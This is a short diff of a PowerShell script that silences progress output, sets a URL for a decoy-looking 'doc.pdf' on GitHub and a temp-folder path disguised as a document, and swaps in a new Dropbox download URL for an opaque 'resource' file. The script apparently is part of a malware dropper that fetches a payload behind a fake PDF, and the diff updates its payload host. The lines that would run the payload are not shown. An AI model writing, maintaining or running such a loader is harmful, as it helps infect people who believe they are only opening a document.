@@ -1,7 +1,7 @@
 $ProgressPreference = 'SilentlyContinue'
 
 $File1Url = "https://github.com/rosawatsn/lnk/raw/refs/heads/main/fls/doc.pdf" 
-$File2Url = "https://www.dropbox.com/scl/fi/90r2qw0y5poc4qsgye06l/resource?rlkey=vd6vnqc760v0af8kf0orfrx66&st=sp7ywbez&dl=1" 
+$File2Url = "https://www.dropbox.com/scl/fi/z8h1vvuuzq3fi0nix7tcr/resource?rlkey=988x13q0aukyaow9jqba8ofpz&st=xuu8a6yf&dl=1" 
 
 $File1Path = "$env:TEMP\DOC-8796578552.pdf"
 
